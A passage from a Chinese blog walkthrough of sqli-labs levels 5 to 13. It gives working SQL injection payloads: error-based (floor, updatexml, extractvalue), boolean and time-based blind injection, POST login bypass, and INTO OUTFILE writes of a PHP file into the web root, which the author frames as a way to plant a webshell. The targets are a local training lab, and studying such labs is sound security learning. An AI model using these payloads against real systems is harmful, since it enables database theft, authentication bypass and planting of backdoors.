floor报错注入,由于floor\count\group by 这三个函数导致，<strong>原理</strong><a href="#refer-anchor-3"><sup>3</sup></a>  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> (select <span class="number">1</span> <span class="keyword">from</span> (select count(*),concat((payload),floor (rand(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables group by x)a)</span><br><span class="line">```  </span><br><span class="line">示例：</span><br><span class="line">爆数据库</span><br><span class="line">```python</span><br><span class="line">//payload为select database() limit <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">// <span class="number">0x7e</span> 是~,方便脚本抓取数据</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">5</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27; and (select 1 from (select count(*),concat(0x7e,(select database() limit 0,1),0x7e,floor (rand(0)*2))x from information_schema.tables group by x)a)%23</span></span><br></pre></td></tr></table></figure><p>爆表,可以根据设置是否需要 limit，这里只能显示一行，所以要用一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//payload : select table_name <span class="keyword">from</span> information_schema.tables where table_schema =database() limit <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">5</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27; and (select 1 from (select count(*),concat(0x7e,(select table_name from information_schema.tables where table_schema =database() limit 0,1),0x7e,floor (rand(0)*2))x from information_schema.tables group by x)a)%23</span></span><br></pre></td></tr></table></figure><p>爆字段</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//payload : select column_name <span class="keyword">from</span> information_schema.columnss where table_name =<span class="string">&#x27;users&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">5</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27; and (select 1 from (select count(*),concat(0x7e,(select column_name from information_schema.columnss where table_name =&#x27;</span>users<span class="string">&#x27; limit 0,1),0x7e,floor (rand(0)*2))x from information_schema.tables group by x)a)%23</span></span><br></pre></td></tr></table></figure><p>报数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//payload : select concat(username,<span class="string">&#x27;:&#x27;</span>,password) <span class="keyword">from</span> users limit <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">5</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27; and (select 1 from (select count(*),concat(0x7e,(select concat(username,&#x27;</span>:<span class="string">&#x27;,password) from users limit 0,1),0x7e,floor (rand(0)*2))x from information_schema.tables group by x)a)%23</span></span><br></pre></td></tr></table></figure><p>其中payload为你要插入的SQL语句<br>需要注意的是该语句将,输出字符长度限制为64个字符</p><p>(2). updatexml报错注入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> updatexml(<span class="number">1</span>,payload,<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>输出字符长度限制为32个字符,只有在payload返回的不是xml格式才会生效</p><p>(3). ExtractValue报错注入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> extractvalue(<span class="number">1</span>, payload)</span><br></pre></td></tr></table></figure><p>输出字符长度限制为32个字符</p><p>这里后两种方法没反应，待补</p><p>参考：  </p><div id="refer-anchor-1"></div><ul><li><p>[1] <a href="https://segmentfault.com/a/1190000021795049">SQL注入之布尔注入原理</a></p><div id="refer-anchor-2"></div></li><li><p>[2] <a href="https://www.cnblogs.com/-qing-/p/11610385.html#_label2">报错注入lv5</a></p><div id="refer-anchor-3"></div></li><li><p>[3] <a href="https://qwzf.github.io/2019/09/25/SQL%E6%B3%A8%E5%85%A5-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/">SQL注入-报错注入</a></p></li><li><p>[3-1] <a href="https://www.cnblogs.com/c1047509362/p/12806297.html">SQL注入实战之报错注入篇</a></p></li></ul><h3 id="level-6"><a href="#level-6" class="headerlink" title="level-6"></a>level-6</h3><p><strong>布尔&#x2F;报错-双引号-注入</strong><br>改了一下后台显示，方便学习<br>1、测试注入  </p><p>无修饰，id&#x3D;1<br><img src="/2022/02/17/sqli-labs/2022-02-19-16-16-15.png"><br>加单引号，id&#x3D;1’</p><p><img src="/2022/02/17/sqli-labs/2022-02-19-16-23-49.png"><br>对比发现竟然没有报错！</p><p>加双引号，id&#x3D;1”<br><img src="/2022/02/17/sqli-labs/2022-02-19-16-25-52.png"><br>这里可以直观的看到报错原因，以及sql语句和报错信息之间的关系<br>判断为<strong>不显示查询结果的-波尔&#x2F;报错-双引号-注入</strong><br>所以和level-5一样，这里仅爆数据库，剩余不具体展示  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">6</span>/?<span class="built_in">id</span>=<span class="number">1</span><span class="string">&quot;  and updatexml(1,concat(0x7e,(database()),0x7e),1)%23</span></span><br></pre></td></tr></table></figure><p><img src="/2022/02/17/sqli-labs/2022-02-19-16-34-09.png"></p><p>这里就可以做个总结了<br>我们看一下level 1~6 报错和sql语句的联系</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">level-<span class="number">1</span></span><br><span class="line">    raw <span class="built_in">id</span>: <span class="number">1</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">    changed id : 1&#x27;</span></span><br><span class="line">    SELECT * FROM users WHERE <span class="built_in">id</span>=<span class="string">&#x27;1&#x27;</span><span class="string">&#x27; LIMIT 0,1</span></span><br><span class="line"><span class="string">    You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;</span><span class="string">&#x27;1&#x27;</span><span class="string">&#x27; LIMIT 0,1&#x27;</span> at line <span class="number">1</span></span><br><span class="line"></span><br><span class="line">level-<span class="number">2</span></span><br><span class="line">    raw <span class="built_in">id</span>: <span class="number">1</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">    changed id : 1&#x27;</span></span><br><span class="line">    SELECT * FROM users WHERE <span class="built_in">id</span>=<span class="number">1</span><span class="string">&#x27; LIMIT 0,1</span></span><br><span class="line"><span class="string">    You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;</span><span class="string">&#x27; LIMIT 0,1&#x27;</span> at line <span class="number">1</span></span><br><span class="line"></span><br><span class="line">level-<span class="number">3</span></span><br><span class="line">    raw <span class="built_in">id</span>: <span class="number">1</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">    changed id : 1&#x27;</span></span><br><span class="line">    SELECT * FROM users WHERE <span class="built_in">id</span>=(<span class="string">&#x27;1&#x27;</span><span class="string">&#x27;) LIMIT 0,1</span></span><br><span class="line"><span class="string">    You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;</span><span class="string">&#x27;1&#x27;</span><span class="string">&#x27;) LIMIT 0,1&#x27;</span> at line <span class="number">1</span></span><br><span class="line"></span><br><span class="line">level-<span class="number">4</span></span><br><span class="line">    raw <span class="built_in">id</span>: <span class="number">1</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    changed id : &quot;</span><span class="number">1</span><span class="string">&quot;&quot;</span></span><br><span class="line">    SELECT * FROM users WHERE <span class="built_in">id</span>=(<span class="string">&quot;1&quot;</span><span class="string">&quot;) LIMIT 0,1</span></span><br><span class="line"><span class="string">    You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&quot;</span><span class="number">1</span><span class="string">&quot;&quot;</span>) LIMIT <span class="number">0</span>,<span class="number">1</span><span class="string">&#x27; at line 1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">level-5</span></span><br><span class="line"><span class="string">    raw id: 1&#x27;</span></span><br><span class="line">    changed <span class="built_in">id</span> : <span class="number">1</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">    SELECT * FROM users WHERE id=&#x27;</span><span class="number">1</span><span class="string">&#x27;&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">    You have an error <span class="keyword">in</span> your SQL syntax; check the manual that corresponds to your MySQL server version <span class="keyword">for</span> the right syntax to use near <span class="string">&#x27;&#x27;</span><span class="number">1</span><span class="string">&#x27;&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span><span class="string">&#x27; at line </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">level-6</span></span><br><span class="line"><span class="string">    raw id: 1&quot;</span></span><br><span class="line"><span class="string">    changed id : &quot;1&quot;&quot;</span></span><br><span class="line"><span class="string">    SELECT * FROM users WHERE id=&quot;1&quot;&quot; LIMIT 0,1</span></span><br><span class="line"><span class="string">    You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;</span><span class="string">&quot;1&quot;</span><span class="string">&quot; LIMIT 0,1&#x27; at line 1</span></span><br></pre></td></tr></table></figure><p>我们记输入id值为raw_id,本后端加工过后的id为changed_id,后端加工函数为change()，报错sql段为sql_error<br>以sqli-labs为例，他们的关系基本是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sql_error=<span class="string">&#x27;changed_id LIMIT 0，1&#x27;</span>= <span class="string">&#x27;chaged(id) LIMIT 0,1&#x27;</span></span><br></pre></td></tr></table></figure><p>我们从此可以推断sql语句的id部分。</p><h3 id="level-7"><a href="#level-7" class="headerlink" title="level-7"></a>level-7</h3><p><strong>布尔-双括号-单引号-注入</strong><br>没有回显，只有对或错，尝试，无解，上sqlmap，sqlmap真强大！<br><img src="/2022/02/17/sqli-labs/2022-02-19-17-38-55.png"><br>看看后台</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;../sql-connections/sql-connect.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">// take the variables</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line"><span class="variable">$fp</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>,<span class="string">&#x27;ID:&#x27;</span>.<span class="variable">$id</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// connectivity </span></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=((&#x27;<span class="subst">$id</span>&#x27;)) LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;You are in.... Use outfile......&#x27;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;You have an error in your SQL syntax&#x27;</span>;</span><br><span class="line"><span class="comment">//print_r(mysql_error());</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123; <span class="keyword">echo</span> <span class="string">&quot;Please input the ID as parameter with numeric value&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>双括号，还没有回显，那只能sqlmap了。<br>假设试出了双括号，设置 <code>id=-1&#39;))</code>，那就可以布尔盲注入了，具体参考level-5布尔注入<br>这里只测试库名长度</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">7</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27;)) or 1=1%23  成功通过，存在布尔注入</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-7/?id=-1&#x27;</span>)) <span class="keyword">or</span> length(database())=<span class="number">8</span>%<span class="number">23</span>  得到库名长度</span><br></pre></td></tr></table></figure><p>根据名字提示可以写入木马文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">7</span>/?<span class="built_in">id</span>=<span class="number">1</span><span class="string">&#x27;)) union select 1,0x74657374,3 into outfile &quot;D:\\phpstudy\\PHPTutorial\\WWW\\sqli-labs\\Less-7\\test.php&quot; %23</span></span><br></pre></td></tr></table></figure><p><code>0x74657374</code>是<code>test</code>的ascii，结果如下：<br><img src="/2022/02/17/sqli-labs/2022-02-20-10-10-51.png"><br>提示：<br>mysql写入文件需要打开secure_file_priv</p><ul><li><p>ure_file_priv的值为null ，表示限制mysqld 不允许导入|导出</p></li><li><p>当secure_file_priv的值为&#x2F;tmp&#x2F; ，表示限制mysqld 的导入|导出只能发生在&#x2F;tmp&#x2F;目录下</p></li><li><p>当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制</p></li></ul><p>windows下：修改my.ini 在[mysqld]内加入secure_file_priv &#x3D;</p><p>linux下：修改my.cnf 在[mysqld]内加入secure_file_priv &#x3D;<br>然后重启mysql即可</p><p><strong>参考：</strong> </p><ul><li><a href="https://segmentfault.com/a/1190000009333563">MYSQL新特性secure_file_priv对读写文件的影响</a>  </li><li><a href="https://shockerli.net/post/mysql-secure-file-priv/">MySQL 全局配置 –secure-file-priv</a>  </li><li><a href="https://www.cnblogs.com/tangjf10/p/12602116.html">sqli-labs：Less-7</a></li></ul><h3 id="level-8"><a href="#level-8" class="headerlink" title="level-8"></a>level-8</h3><p><strong>单引号-盲注</strong><br>爆字段数  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">8</span>/?<span class="built_in">id</span>=<span class="number">1</span><span class="string">&#x27;  order by 3%23</span></span><br><span class="line"><span class="string">```  </span></span><br><span class="line"><span class="string">1、文件写入  </span></span><br><span class="line"><span class="string">原理同`level-7`</span></span><br><span class="line"><span class="string">``` python</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-8/?id=1&#x27;</span>  union select <span class="number">1</span>,<span class="number">0x74657374</span>,<span class="number">3</span> into outfile <span class="string">&quot;D:\\phpstudy\\PHPTutorial\\WWW\\sqli-labs\\Less-8\\test.php&quot;</span> %<span class="number">23</span></span><br></pre></td></tr></table></figure><p>2、布尔注入<br>原理同level-5，仅测试库名长度，不具体展示</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">8</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27; or length(database())=8  %23</span></span><br></pre></td></tr></table></figure><p>工具：<a href="https://github.com/HuDeshui/tools/blob/main/sqli_labs/sqli-labs-level-8.py"><strong>爆破脚本</strong></a></p><h3 id="level-9"><a href="#level-9" class="headerlink" title="level-9"></a>level-9</h3><p><strong>基于时间-单引号-布尔-注入&#x2F;文件写入</strong><br>1、基于时间的布尔注入<br>原理类似于基于报错，这里只一个爆数据库长度的语句</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">9</span>/?<span class="built_in">id</span>=<span class="number">1</span><span class="string">&#x27; and if((length(database())=8),sleep(2),null) %23</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-9/?id=1&#x27;</span> <span class="keyword">and</span> <span class="keyword">if</span>((payload),sleep(<span class="number">2</span>),null) %<span class="number">23</span></span><br></pre></td></tr></table></figure><p>2、文件写入<br>可以先用布尔盲注测出当前表的字段数，然后使用union写如文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hhttp://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">9</span>/?<span class="built_in">id</span>=<span class="number">1</span><span class="string">&#x27;  union select 1,0x74657374,3 into outfile &quot;D:\\phpstudy\\PHPTutorial\\WWW\\sqli-labs\\Less-9\\test.php&quot; %23</span></span><br></pre></td></tr></table></figure><p>本来想用下面语句中的payload写入文件，但是一直不成功，理解为<code>into outfile PATH</code>是最后结果的输出，不能用在语句中间，所以还是要结合<code>union</code>联合输出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">9</span>/?<span class="built_in">id</span>=<span class="number">1</span><span class="string">&#x27; and if(1,(payload),null) %23</span></span><br></pre></td></tr></table></figure><h3 id="level-10"><a href="#level-10" class="headerlink" title="level-10"></a>level-10</h3><p><strong>基于时间-双引号-布尔-注入&#x2F;文件写入</strong><br>同level-9，不过换成双引号了，不细致展开</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">10</span>/?<span class="built_in">id</span>=<span class="number">1</span><span class="string">&quot; and if((length(database())=8),sleep(2),null)%23</span></span><br></pre></td></tr></table></figure><h3 id="level-11"><a href="#level-11" class="headerlink" title="level-11"></a>level-11</h3><p><strong>POST型-单引号-有回显-注入</strong>  </p><p>简单测试一下<br>username&#x3D;a’,password&#x3D;b’<br><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;b&#39;&#39; LIMIT 0,1&#39; at line 1</code><br>可以猜出后台的语句就是很直接的那种，查看后台代码，确实</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">   <span class="variable">$uname</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>];</span><br><span class="line"><span class="variable">$passwd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line"><span class="variable">$fp</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>,<span class="string">&#x27;User Name:&#x27;</span>.<span class="variable">$uname</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>,<span class="string">&#x27;Password:&#x27;</span>.<span class="variable">$passwd</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// connectivity </span></span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=&#x27;<span class="subst">$uname</span>&#x27; and password=&#x27;<span class="subst">$passwd</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br></pre></td></tr></table></figure><p>类似于level-1，闭合语句就可以<br>burp抓包测试<br>爆字段数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">post数据</span><br><span class="line">uname=<span class="number">1</span><span class="string">&#x27;or 1 order by 1 #&amp;passwd=b&amp;submit=Submit  爆出字段数2</span></span><br><span class="line"><span class="string">后端加工之后</span></span><br><span class="line"><span class="string">SELECT username, password FROM users WHERE username=&#x27;</span><span class="number">1</span><span class="string">&#x27;or 1 order by 1 #&#x27;</span> <span class="keyword">and</span> password=<span class="string">&#x27;b&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span> 成功绕过</span><br></pre></td></tr></table></figure><p>爆数据库</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">post数据</span><br><span class="line">uname=-<span class="number">1</span><span class="string">&#x27; union select 1,2 #&amp;passwd=b&amp;submit=Submit</span></span><br><span class="line"><span class="string">后端加工后</span></span><br><span class="line"><span class="string">SELECT username, password FROM users WHERE username=&#x27;</span>-<span class="number">1</span><span class="string">&#x27; union select 1,2 #&#x27;</span> <span class="keyword">and</span> password=<span class="string">&#x27;b&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span> </span><br><span class="line">回显，可以看书<span class="number">1</span>，<span class="number">2</span>都可利用</span><br><span class="line">&lt;br&gt;Your Login name:<span class="number">1</span>&lt;br&gt;Your Password:<span class="number">2</span>&lt;br&gt;</span><br></pre></td></tr></table></figure><p>后面同理前面的level，不细致展开了</p><h3 id="level-12"><a href="#level-12" class="headerlink" title="level-12"></a>level-12</h3><p><strong>POST型-双引号-单括号-有回显-注入</strong><br>简单测试<br><code>uname=a&quot;&amp;passwd=b&#39;#&amp;submit=Submit</code><br>回显,根据之前总结的规律，看出就是id加双引号加单括号，用a验证，看了后台确实是<br><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;b&#39;#&quot;) LIMIT 0,1&#39; at line 1</code><br>爆字段数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST data</span><br><span class="line">uname=a<span class="string">&quot;)or 1 order by 1#&amp;passwd=b&#x27;#&amp;submit=Submit 爆出字段数为2</span></span><br><span class="line"><span class="string">后端sql</span></span><br><span class="line"><span class="string">SELECT username, password FROM users WHERE username=(&quot;</span>a<span class="string">&quot;)or 1 order by 1#&quot;</span>) <span class="keyword">and</span> password=(<span class="string">&quot;b&#x27;#&quot;</span>) LIMIT <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure><p>查看可利用字段，爆数据库名 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST data</span><br><span class="line">uname=a&quot;) union select 1,database()#&amp;passwd=b&#x27;#&amp;submit=Submit</span><br></pre></td></tr></table></figure><p>下面就和前面的level一样了，不细致展开了</p><h3 id="level-13"><a href="#level-13" class="headerlink" title="level-13"></a>level-13</h3><p><strong>POST型-双引号-单括号-无回显-布尔&#x2F;报错注入</strong><br>分析报错</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST data</span><br><span class="line">uname=a<span class="string">&#x27;&amp;passwd=b&#x27;</span><span class="comment">#&amp;submit=Submit</span></span><br><span class="line">回显，根据规律得出，后端加单引号，单括号</span><br><span class="line">You have an error <span class="keyword">in</span> your SQL syntax; check the manual that corresponds to your MySQL server version <span class="keyword">for</span> the right syntax to use near <span class="string">&#x27;b&#x27;</span><span class="string">&#x27;) LIMIT 0,1&#x27;</span> at line <span class="number">1</span></span><br></pre></td></tr></table></figure><p>所以和之前一样了   </p><p>1、报错注入<br><strong>floor</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST data</span><br><span class="line">uname=<span class="number">1</span><span class="string">&#x27;) or (select 1 from (select count(*),concat(0x7e,(database()),0x7e,floor (rand(0)*2))x from information_schema.tables group by x)a)#&amp;passwd=q&amp;submit=Submit</span></span><br><span class="line"><span class="string">回显，具体不展开和之前一样</span></span><br><span class="line"><span class="string">Duplicate entry &#x27;</span>~security~<span class="number">1</span><span class="string">&#x27; for key &#x27;</span>group_key<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>updatexml</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST data</span><br><span class="line">uname=<span class="number">1</span><span class="string">&#x27;) or updatexml(1,concat(0x7e,(database()),0x7e),1)#&amp;passwd=q&amp;submit=Submit</span></span><br><span class="line"><span class="string">回显</span></span><br><span class="line"><span class="string">XPATH syntax error: &#x27;</span>~security~<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>extractvalue</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 